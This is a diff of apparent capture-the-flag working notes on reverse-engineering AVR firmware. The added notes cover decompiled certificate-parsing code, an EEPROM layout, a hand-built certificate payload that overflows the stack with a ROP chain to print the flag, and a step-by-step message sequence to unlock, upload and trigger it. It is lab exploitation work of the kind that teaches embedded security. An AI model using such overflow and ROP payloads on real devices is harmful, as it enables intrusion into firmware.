@@ -652,7 +652,7 @@ void possible_hmac_4b03(char *dest, char *temp, short eighty, char *src, uint32_
 	// possibly HMAC_SHA_256?
 }
 
-void parse_cert_6481(void *arg0, void *arg1) {
+void parse_cert_6481(void *arg0, short length) {
 	// stack frame 9
 	char y1; // Y+1
 	char y2; // Y+2
@@ -660,13 +660,13 @@ void parse_cert_6481(void *arg0, void *arg1) {
 	char y4; // Y+4
 	char y5; // Y+5
 	// arg0 at  Y+6..7
-	// arg1 at  Y+8..9
+	// length at Y+8..9
 	if (cert_lock_102e61 != 11) {
 		remember_and_die();
 	} else if (*arg0 != 0x30) {
 		printf("Certificate format not supported");
 		die();
-	} else if (arg1 < 64 || arg0[1]+2 != arg1) {
+	} else if (length < 64 || arg0[1]+2 != length) {
 		printf("Key length not supported");
 		die();
 	}
@@ -1019,6 +1019,23 @@ void cert_mask_flag_4de4(void) {
 	flag_mask_102ef0 = rc2; // hides flag, will show all 0xff after this line, but print_flag_or_die_4E8F fixes that
 }
 
+void init_eeprom_certs_65c1(void) {
+	char i;       // Y+1
+	char j;       // Y+2
+	char fcount;  // Y+3
+	char y4;      // Y+4
+	char y5[16];  // Y+0x5..0x14
+	char y15[16]; // Y+0x15..0x24
+
+    memset(y5, 0, 16);
+	eeprom_read_block(y5, 0x1028, 16); // session key?
+	memset(y15, 0xff, 16);
+	if (strncmp(y5, y15, 16)) return; // already initalized
+	if (blah blah blah) remember_and_die();
+	cert_mask_flag_4de4();
+	cert_load_and_check_63e0();
+}
+
 void cert_load_and_check_63e0(void) {
 	// stack frame 0x112
 	short y1;          // Y+1..2
@@ -1254,7 +1271,7 @@ main_loop_2c8b
 	100a: 24 bytes of
 		- default: C44ABF3BA6C1F6FC4B730D82E3694BF131D102CB5A2DDE
 	1028: 16 bytes of session key, from generate_session_key
-		- default: AB7CDFB4C464DCD791
+		- default: AB7CDFB4C464DCD7 91136B5D33C62271
 	1040: 120 bytes of cert
 		- default starts: 30768095269736361
 
@@ -1341,6 +1358,7 @@ Description:
 Breakpoints:
 	7226 / 0xe44c usart_print
 	2c8b / 0x5916 main_loop_2c8b
+	63fc / 0xc7f8 in cert_load_and_check_63e0
 
 ### Patches:
 	6a00 / 0xd400 -- 8f3f -> 8330
@@ -1373,7 +1391,7 @@ Breakpoints:
 
 ```
 
-### --
+### Simulating EEPROM
 Issue: Simulator doesn't do EEPROM writes
 Solution: Find another spot and patch it to write there...
 	- BSS ends at 0x3081, so I could use 0x3100+
@@ -1394,6 +1412,83 @@ Other Gadgets:
 	* loc_2ab5: copy r20 byte from Z to X, etc
 	* ... lots of these
 	* memmove, memcpy: copy rx20 bytes from rx22 to rx24
+
+Existing Structure:
+30 -- magic byte
+76 -- length of following bytes
+80 09 52 69 73 63 61 72 20 43 41
+	-- field 0x80, 0x9 bytes, data
+81 0a 4e 49 53 54 20 50 2d 31 39 32
+82 08 ab ba 42 c0 ff ee 13 37
+83 31 04 8d ab 11 e2 d3 a7 37 e2 d9 57 57 9f b8 ab dd 03 c8 4f 9b ba a8 9d c6 33 54 03 54 71 5a 80 a8 d0 29 b6 b3 87 f2 ac 2f db 00 ec a3 ce 0d b7 26 7e
+	-- must by fourth data field, must be 0x31
+84 20 d9 00 3c ac af 5b 93 5f 9f cb 0f 17 65 b0 cf 9b d7 a2 a2 35 cc 03 a6 fa d6 8d a8 34 fc 8e 21 02
+
+My Payload:
+30 -- magic byte
+?? -- length of following bytes
+80 09 52 69 73 63 61 72 20 43 41 -- 'Riscar CA'
+	-- field 0x80, 0x9 bytes, data
+81 0a 4e 49 53 54 20 50 2d 31 39 32 -- 'NIST P-192' ... payload here ...
+82 08 ab ba 42 c0 ff ee 13 37 -- magic bytes
+83 31 04 8d ab 11 e2 d3 a7 37 e2 d9 57 57 9f b8 ab dd 03 c8 4f 9b ba a8 9d c6 33 54 03 54 71 5a 80 a8 d0 29 b6 b3 87 f2 ac 2f db 00 ec a3 ce 0d b7 26 7e
+	-- must by fourth data field, must be 0x31
+84 20 d9 00 3c ac af 5b 93 5f 9f cb 0f 17 65 b0 cf 9b d7 a2 a2 35 cc 03 a6 fa d6 8d a8 34 fc 8e 21 02
+
+Payload is:
+	81 ??
+		-- magic and length
+	4e 49 53 54 20 50 2d 31 39 32
+		-- ten bytes
+	01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f 10 11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f 20 21 22 23 24 25 26 27 28 29 2a 2b 2c 2d 2e 2f 30 31 32 33 34 35 36 37 38 39 3a 3b 3c 3d 3e 3f 40 41 42 43 44 45 46 47 48 49 4a 4b 4c 4d 4e 4f 50 51 52 53 54 55 56 57 58 59 5a
+		-- ninety bytes padding
+	4a 09 ?? 08 ?? ?? 3b 00
+		-- four bytes to cross locals, + four more for cert pointer and saved sp and 
+ROP:
+	00 79 f7    -- return to INT0_
+	21 0a       -- populate Z
+	27 26 25 24 23 22 21 20 -- X, rx24, r2x22, rx20
+	13 37       -- populate rx18
+	00 00 00 00 -- RAMP bytes
+	80 00 01    -- SREG, r0 r1
+	00 35 14    -- return to sub_34e2 to get leet
+	ca fe ba be -- pops
+	00 4e 8f    -- return to print_flag_or_die_4E8F
+
+Built:
+30 f4 80 09 52 69 73 63 61 72 20 43 41 81 88 4e 
+49 53 54 20 50 2d 31 39 32 01 02 03 04 05 06 07 
+08 09 0a 0b 0c 0d 0e 0f 10 11 12 13 14 15 16 17 
+18 19 1a 1b 1c 1d 1e 1f 20 21 22 23 24 25 26 27 
+28 29 2a 2b 2c 2d 2e 2f 30 31 32 33 34 35 36 37 
+38 39 3a 3b 3c 3d 3e 3f 40 41 42 43 44 45 46 47 
+48 49 4a 4b 4c 4d 4e 4f 50 51 52 53 54 55 56 57 
+58 59 5a 4a 09 88 08 00 79 f7 21 0a 27 26 25 24 
+23 22 21 20 13 37 00 00 00 00 80 00 01 00 35 14 
+ca fe ba be 00 4e 8f 82 08 ab ba 42 c0 ff ee 13 
+37 83 31 04 8d ab 11 e2 d3 a7 37 e2 d9 57 57 9f 
+b8 ab dd 03 c8 4f 9b ba a8 9d c6 33 54 03 54 71 
+5a 80 a8 d0 29 b6 b3 87 f2 ac 2f db 00 ec a3 ce 
+0d b7 26 7e 84 20 d9 00 3c ac af 5b 93 5f 9f cb 
+0f 17 65 b0 cf 9b d7 a2 a2 35 cc 03 a6 fa d6 8d 
+a8 34 fc 8e 21 02
+
+
+Simulating it:
+	* injection point is in
+		main_500E
+			-> init_eeprom_certs_65C1
+			-> cert_load_and_check_63e0
+			-> cert_check_valid_6297
+	* I've patched EEPROM to exist at RAM:0x3200,
+	* need to either SER EEPROM:0x1028 or branch jam to make it init_eeprom_certs_65C1
+Actual:
+	* my cert is at 3e9d
+	* my return address is `006410`, at RAM:0x3e93
+	* Y is 0x3d5e
+	* ... might work ...
+	* .. .. bc7c13b7fbadde203e79e51554fdb4398b46252992bcce83360e2cfa ....
+	* not the flag, it would be a hex string, not this.
 
 ## Finding the Injection Point
 To "smash the stack", we need an unbounded write to a stack array. Which means we're looking for Z+, Z- or similar.
@@ -1609,16 +1704,17 @@ Todo:
 		-> sub_2720 is the thing that does that
 	understand how sub_2720 works
 	figure out what's up with readMessageBuffer_29a7()...
+	develop a usable payload
 
-Phase 0:
+Phase 0: Unlock
 	1. send `665#022700`, get DH challenge
 		* response will start with `666#0x6700`, ignore that
 	2. find the discrete logarithm of it, power: 0x7a69, mod: 0xa59068ff
 		* I've written a ruby script, `./getResponse.rb <challenge>`
 	3. send `665#??2701{8-bytes)`
-	4. see a reply like `666#0x6701`
+	4. see a reply like `666#026701`
 
-Phase 1:
+Phase 1: Upload
 	1. send a message like `665#__3d...`
 		`__` -- total length above
 		`21` -- 2 byte eeprom address length, 1 byte content address length
@@ -1627,8 +1723,13 @@ Phase 1:
 		`...` -- actual cert
 	2. eeprom_write_arbitrary_block_ca3 drops my cert to eeprom
 
-Phase 2:
+Phase 2: Renew Session Key
+	1. send `665#0431010143` to invalidate the session key at EEPROM:0x1028
+	2. see a reply like `666#057101014301`
+
+Phase 3:
 	1. reboot board
+	?. board checks my "cert", if it doesn't like it, replaces it with default
 	2. cert_load_and_check_63e0 fires, loads my "cert" from EEPROM:0x1040
 	3. invokes cert_check_valid_6297, which overflows
 	4. return to INT0_ populates registers
